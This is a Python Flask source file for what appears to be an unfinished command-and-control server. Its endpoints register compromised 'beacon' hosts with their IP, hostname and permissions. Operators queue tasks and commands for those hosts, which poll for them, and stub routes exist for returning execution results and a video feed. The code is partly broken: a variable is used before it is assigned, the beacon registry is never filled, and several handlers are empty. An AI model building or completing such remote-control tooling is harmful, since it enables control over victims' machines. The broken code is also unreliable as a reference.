from flask import Flask, request, jsonify
from time import time
import ssl
import os
from agent import Agent
from werkzeug.exceptions import BadRequest
import uuid


app = Flask(__name__)

# Define the db in the future, for now we hardcode it and test
db_name = "monke"
db_id = "1"
db_key= "xyz"
db_config = "10"

agents= Agent(
    name=db_name,
    id= db_id,
    key=db_key,
    path= f"/home/exe/agents/{db_name.lower()}",      #Make sure to add a function to create the path on initial server load
    config= db_config

)

beacons = {}

def initial_setup():
    base_data_path = "/home/exe/data"
    subdirectories = ["beacons", "tasks", "logs"]

    if not os.path.exists (base_data_path):
        os.makedirs(base_data_path)

        for subdir in subdirectories:
            full_path = os.path.join(base_data_path, subdir)
            os.makedirs(full_path, exist_ok=True)
            print(f"[+]Created directories: {full_path}")


# Root webPath
@app.route("/")
def web_root():
    return "<p>Hello!</p>"

# Initial beacon register, beacon returns 2 or 3 arguments
@app.route("/c2/register_beacon", methods=['POST'])
def register_beacon_route():
    beacon_path = os.path.join(agents.get_beacon_path(), f"{beacon_id}.txt")

    try:
        data = request.json
        if not data:
             raise BadRequest("No JSON data provided")   #Handle invalid data
        
        remote_ip = data.get('remote_ip')
        remote_hostname = data.get ('remote_hostname')
        current_permission = data.get ('remote_permissions')

        if not all([remote_ip, remote_hostname, current_permission]):
            return jsonify({"Message": "Some data is missing"}), 400

        beacon_id = str(uuid.uuid4())

    except BadRequest as e:
        return jsonify({"Error": f"Invalid JSON data: {str(e)}"}), 400
            
        #Write data to DB here ------------------------

    try:
        with open(beacon_path, "a") as f:
            f.write(f"{remote_hostname},{remote_ip},{current_permission}\n")

    except PermissionError:
        return jsonify({"Error": "Permission denied while writing beacon data"}), 403
    except FileNotFoundError:
        return jsonify({"Error": "Beacon file path not found"}), 404
    except OSError as e:  # Catches other OS-related errors
        return jsonify({"Error": f"Failed to write beacon data: {str(e)}"}), 500

    return jsonify({"message": "Beacon registered succesfully"}), 200

# Beacon reads from this endpoint, server writes the data to file and endpoint reflects it
@app.route("/c2/read_task", methods=['GET'])
def read_task_route():
    beacon_id = request.args.get('beacon_id')

    if not beacon_id or beacon_id not in beacons:
        return jsonify({"Error": "Invalid beacon ID"}), 404
    
    task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")

    if not os.path.exists(task_file):
        return jsonify({"Error": "Task file not found"}), 404

    with open(task_file, "r") as f:
        task = f.readlines()

    return jsonify({"task": task}), 200




# Operator writes tasks and commands to this endpoint
@app.route ("/c2/write_task", methods=['POST'])
def write_task_route():
    try:
        data = request.json
        if not data:
            return jsonify({"Error": "No JSON data provided"}), 400

        beacon_id = data.get('beacon_id')
        task = data.get('task')

        if not beacon_id or not task:
            return jsonify({"Error": "Beacon ID or task is missing"}), 400

        # Check if beacon exists
        if beacon_id not in beacons:
            return jsonify({"Error": "Invalid beacon ID"}), 404

        # Write the task to the beacon's task file
        task_file = os.path.join("data/tasks", f"{beacon_id}_tasks.txt")
        os.makedirs(os.path.dirname(task_file), exist_ok=True)

        with open(task_file, "a") as f:
            f.write(f"{task}\n")

        return jsonify({"message": "Task assigned successfully!"}), 200

    except OSError as e:
        return jsonify({"Error": f"Failed to assign task: {str(e)}"}), 500
    
# Beacon writes data to this endpoint
@app.route ("/c2/return_execution_data", methods= ['POST'])
def randomshit():
    pass

# Route for PI functions
@app.route ("/c2/write_pi_task", methods= ['GET'])
def pistuff1():
    pass

# Route for returning PI functions
@app.route ("/c2/return_pi_execution_data", methods= ['POST'])
def pistuff2():
    pass

# Route for streaming video feed
@app.route("/c2/pi_video_feed")
def video_feed():
    pass


if __name__ == '__main__':

    base_data_path = "/home/exe/data"
    subdirectories = ["beacon", "tasks", "logs"]

    if not os.path.exists(base_data_path) or any(not os.path.exists(os.path.join(base_data_path, subdir)) for subdir in subdirectories):
         print("[!] Creating directories . . . ")
         initial_setup()

  #  cert_file = '/path/to/file'
   # key_file = '/path/to/key'

    #context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    #context.load_cert_chain(certfile=cert_file, keyfile=key_file)

    app.run(host='0.0.0.0', port=80)